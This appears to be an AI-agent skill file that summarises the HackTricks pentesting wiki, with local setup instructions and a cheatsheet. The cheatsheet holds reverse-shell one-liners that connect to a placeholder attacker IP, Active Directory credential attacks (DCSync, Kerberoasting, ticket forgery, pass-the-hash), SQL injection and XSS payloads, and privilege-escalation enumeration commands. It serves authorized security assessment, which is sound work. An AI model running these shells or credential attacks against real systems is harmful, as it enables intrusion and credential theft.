---
name: hacktricks
description: HackTricks — The ultimate pentesting methodology wiki (12.8k ⭐). Covers web, network, cloud, mobile, binary exploitation, reversing, crypto, hardware, AI security, privacy/OPSEC, forensics, and more. Use this skill to quickly navigate techniques, run locally, and reference cheatsheets during assessments.
---
# HackTricks Skill — Pentesting Methodology Encyclopedia

## Overview
**HackTricks** (https://book.hacktricks.xyz / https://github.com/HackTricks-wiki/hacktricks) is the most comprehensive community-driven pentesting wiki. 12.8k ⭐, 5,783+ commits, 20+ major categories. Built with mdbook, multi-language (EN/ES/FR/DE/JA/KO/ZH/...).

**Online:** https://book.hacktricks.xyz
**Repo:** https://github.com/HackTricks-wiki/hacktricks

---

## Quick Start — Run Locally

```bash
# Option 1: Docker Compose (recommended)
git clone https://github.com/HackTricks-wiki/hacktricks
cd hacktricks
docker compose up
# Open http://localhost:3337

# Option 2: Docker run (pick language via HT_LANG)
export HT_LANG="master"  # en; or es, fr, de, ja, ko, zh, etc.
docker run -d --rm --platform linux/amd64 -p 3337:3000 \
  -v $(pwd)/hacktricks:/app \
  ghcr.io/hacktricks-wiki/hacktricks-cloud/translator-image \
  bash -c "cd /app && git checkout $HT_LANG && git pull && MDBOOK_PREPROCESSOR__HACKTRICKS__ENV=dev mdbook serve --hostname 0.0.0.0"
```

---

## Category Map (from SUMMARY.md)

| Category | Key Topics | When to Use |
|----------|------------|-------------|
| **Generic Methodologies** | Pentesting methodology, recon, fuzzing, threat modeling, phishing, forensics (Linux/Windows/Android/iOS/Docker/memory/pcap), Python/Rust/Lua sandbox escapes | Planning & reference |
| **Privacy / OPSEC** | Anonymous access/payments, attribution evasion, covert access, APT case studies, privacy OS, cryptocurrency privacy | Red team infrastructure |
| **Generic Hacking** | Brute force, reverse shells (Linux/Win/MSFvenom), tunneling, exfiltration, exploit search, archive path traversal | Post-exploitation |
| **Linux Hardening** | PrivEsc (SUID/SGID/capabilities/Sudo/kernel CVEs), escaping jails, interesting files/groups, SELinux, kernel modules | Linux post-exploit |
| **Windows Hardening** | PrivEsc, token manipulation, lateral movement (SMB/WMI/RDP/WinRM), AD/kerberos (AS-REP roasting, Kerberoasting, DCSync), GPO, AppLocker, AMSI bypass, Event Log tampering | Windows/AD post-exploit |
| **macOS Hardening** | PrivEsc, TCC bypass, SIP, entitlements, DYLD injection, launch agents | macOS post-exploit |
| **Network Services Pentesting** | 100+ services: DNS, SMB, RPC, LDAP, Kerberos, SQL (MySQL/Postgres/MSSQL/Oracle), Redis, Mongo, Elastic, Kafka, RDP, SSH, FTP, SMTP, IMAP, POP3, SNMP, NTP, DHCP, Docker, Kubernetes API, etcd, Consul, Vault, Redis, Memcached, VNC, X11, Rsync, Git, SVN, Jenkins, GitLab, Jira, Confluence, Kafka, RabbitMQ, Cassandra, CouchDB, Redis, MongoDB, Elasticsearch, etc. | Service enumeration/exploit |
| **Pentesting Web** | **Massive**: Methodology, recon, WAF bypass, 403/401 bypass, SSRF, SQLi (MySQL/Postgres/MSSQL/Oracle/SQLite/NoSQL), XSS, CSRF, SSRF, XXE, deserialization (Java/.NET/PHP/Python/Node/Ruby/Go), template injection (SSTI), prototype pollution, GraphQL, WebSocket, WebRTC, OAuth/OIDC/SAML, JWT, API testing, file upload, LFI/RFI, path traversal, race conditions, IDOR, business logic, cache poisoning, HTTP smuggling, XS-Leaks, CSP bypass, Electron apps | Web app testing |
| **Cloud Security** | Kubernetes, AWS/GCP/Azure, CI/CD (GitHub/Jenkins/Terraform) — *links to cloud.hacktricks.wiki* | Cloud pentesting |
| **Mobile Pentesting** | Android (root detection bypass, Frida, Objection, drozer, certificate pinning bypass), iOS (jailbreak, Frida, Cycript, Objection), mobile API testing, Flutter/React Native | Mobile app testing |
| **Desktop App Security** | Electron (contextIsolation RCE, auto-update, preload/IPC injection) | Desktop apps |
| **Binary Exploitation** | Stack overflow (ROP/JOP/ret2libc/ret2csu/ret2dlresolve/SROP/BROP), heap (tcache/fastbin/unsorted/large bin, House of *), format strings, integer overflow, kernel (Linux/Windows/FreeBSD/VM escape), Chrome, iOS, Adreno GPU, PS5 | Exploit dev/CTF |
| **Reversing** | Tools: Ghidra, IDA, Angr, Z3, Cheat Engine, Blobrunner, WinDbg, KernelFlirt; Node.js/V8 bytecode deobfuscation; malware APIs; Windows exception-driven control flow | Malware analysis/RE |
| **Crypto** | Symmetric, hashes/MACs/KDFs, RSA attacks, TLS/certs, crypto in malware, CTF workflow | Crypto challenges |
| **Stego** | Images, audio, text, documents, malware/network stego | CTF/forensics |
| **Blockchain/Smart Contracts** | DeFi/AMM, ERC-4337, Slither mutation testing, Safe delegatecall proxy, web3 red teaming | Web3 security |
| **AI Security** | LLM gateway trust boundaries, AI agent security, MCP/A2A protocol security, prompt injection, RCE via models, KYC bypass, embedded browser trust boundaries, AI-assisted fuzzing/source review | AI/LLM pentesting |
| **Hardware/Physical** | Physical attacks, hardware hacking (UART/I2C/SPI/JTAG/SWO/ARM CoreSight), radio (RFID/BLE/Flipper Zero/Proxmark/FISSURE/sub-GHz/VSAT), firmware analysis (UEFI/bootloader/Android/MediaTek/Synology), KIOSK escape | Hardware/IoT |
| **Industrial Control Systems** | Modbus, DNP3, IEC 60870-5-104, S7Comm, OPC UA, BACnet, EtherNet/IP, PROFINET, wireless HART, ISA100.11a | OT/ICS security |

---

## Cheatsheet Quick Reference

### Reverse Shells
```bash
# Linux (HackTricks: generic-hacking/reverse-shells/linux.md)
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Windows (generic-hacking/reverse-shells/windows.md)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

### Linux PrivEsc Checklist (linux-hardening/main-system-information/linux-privilege-escalation-checklist.md)
```bash
# Quick enum
sudo -l
id
find / -perm -4000 2>/dev/null  # SUID
find / -perm -2000 2>/dev/null  # SGID
getcap -r / 2>/dev/null         # Capabilities
cat /etc/sudoers
ps aux | grep root
ss -tulpn
ls -la /etc/cron* /var/spool/cron*
```

### Windows AD Attacks (windows-hardening/active-directory-methodology/)
| Attack | Tool/Command |
|--------|--------------|
| Kerberoasting | `GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/USER` |
| AS-REP Roasting | `GetNPUsers.py -dc-ip DC_IP DOMAIN/ -no-pass` |
| DCSync | `secretsdump.py -just-dc DOMAIN/ADMIN@DC_IP` |
| Golden Ticket | `ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN USER` |
| Silver Ticket | `ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain DOMAIN -spn SERVICE/SPN USER` |
| Pass-the-Ticket | `export KRB5CCNAME=ticket.kirbi` |
| Pass-the-Hash | `pth-winexe -U DOMAIN/USER%HASH //TARGET cmd` |

### Web — SQL Injection (pentesting-web/sql-injection/)
| DB | Union Payload | Blind/Time-Based |
|----|---------------|------------------|
| MySQL | `' UNION SELECT 1,2,3-- -` | `' AND (SELECT SLEEP(5))--` |
| PostgreSQL | `' UNION SELECT 1,2,3--` | `' AND (SELECT pg_sleep(5))--` |
| MSSQL | `' UNION SELECT 1,2,3--` | `' WAITFOR DELAY '0:0:5'--` |
| Oracle | `' UNION SELECT 1,2,3 FROM DUAL--` | `' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5))--` |

### Web — XSS (pentesting-web/xss-cross-site-scripting/)
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Filter bypass -->
<IMG SRC=JaVaScRiPt:alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### Network — Common Service Ports (network-services-pentesting/)
| Service | Port | Enum Commands |
|---------|------|---------------|
| SSH | 22 | `ssh-audit`, `nmap -sV -p22 --script ssh-*` |
| SMB | 445 | `enum4linux -a`, `smbclient -L //IP`, `crackmapexec smb IP` |
| LDAP | 389/636 | `ldapsearch -x -H ldap://IP -b "DC=domain,DC=com"`, `ldapdomaindump` |
| Kerberos | 88 | `kerbrute`, `GetUserSPNs.py`, `GetNPUsers.py` |
| MSSQL | 1433 | `mssqlclient.py`, `sqsh`, `nmap --script ms-sql-info` |
| MySQL | 3306 | `mysql -h IP -u root`, `nmap --script mysql-info` |
| PostgreSQL | 5432 | `psql -h IP -U postgres`, `nmap --script pgsql-*` |
| Redis | 6379 | `redis-cli -h IP INFO`, `redis-cli -h IP CONFIG GET *` |
| MongoDB | 27017 | `mongo IP:27017`, `nmap --script mongodb-info` |
| Elasticsearch | 9200 | `curl IP:9200/_cat/indices`, `curl IP:9200/_cluster/health` |
| Docker | 2375/2376 | `docker -H IP:2375 ps`, `curl IP:2375/version` |
| Kubernetes API | 6443 | `kubectl --server=https://IP:6443 --token=TOKEN get pods -A` |

---

## Usage Patterns in This Platform

### Pattern 1: Local Reference During Assessment
```bash
# Start local instance
cd /app/data/hacktricks && docker compose up -d
# Browse http://localhost:3337 while testing
```

### Pattern 2: Search for Specific Technique
```bash
# In the local mdbook, use built-in search (top-right)
# Or grep the src/ directory:
grep -r "kerberoasting" /app/data/hacktricks/src --include="*.md"
```

### Pattern 3: Create Task-Specific Checklist
```bash
# Extract relevant sections for a web app test:
# 1. pentesting-web/web-vulnerabilities-methodology.md
# 2. pentesting-web/sql-injection/
# 3. pentesting-web/xss-cross-site-scripting/
# 4. pentesting-web/ssrf/
# 5. pentesting-web/authentication-bypass/
```

### Pattern 4: Offline PDF/Export
```bash
cd hacktricks
mdbook build
# Output in book/ — can zip for offline use
```

---

## Integration with Other Skills

| Skill | Synergy |
|-------|---------|
| `artex` | ARTEX agents can reference HackTricks methodology for planning |
| `api-recon` | HackTricks External Recon Methodology complements API recon |
| `scopesentry` | HackTricks network service enum guides scope discovery |

---

## Language Support
Set `HT_LANG` for local instance:
- `master` — English (default)
- `es` — Spanish
- `fr` — French
- `de` — German
- `ja` — Japanese
- `ko` — Korean
- `zh` — Chinese
- `pt` — Portuguese
- `it` — Italian
- `tr` — Turkish
- `vi` — Vietnamese
- `ru` — Russian (community)
- ...and more (see repo branches)

---

## Updating
```bash
cd hacktricks
git pull
docker compose build
docker compose up -d
```

---

## Safety & Legal
⚠️ **Authorized testing only.** HackTricks documents offensive techniques for education and authorized assessments.
- Only use against systems you own or have explicit written authorization for
- Respect bug bounty scope / rules of engagement
- Comply with local laws (CFAA, Computer Misuse Act, GDPR, etc.)
- The wiki includes a Values & FAQ: `welcome/hacktricks-values-and-faq.md`

---

## Quick Links (Online)
- **Main:** https://book.hacktricks.xyz
- **Cloud:** https://cloud.hacktricks.wiki
- **Repo:** https://github.com/HackTricks-wiki/hacktricks
- **PEASS (priv esc scripts):** https://github.com/carlospolop/PEASS-ng
- **HackTricks CLI:** `pip install hacktricks-cli` (community)